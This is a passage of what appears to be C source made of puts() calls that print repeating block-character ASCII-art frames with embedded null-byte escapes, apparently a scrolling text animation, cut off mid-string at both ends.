\x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ 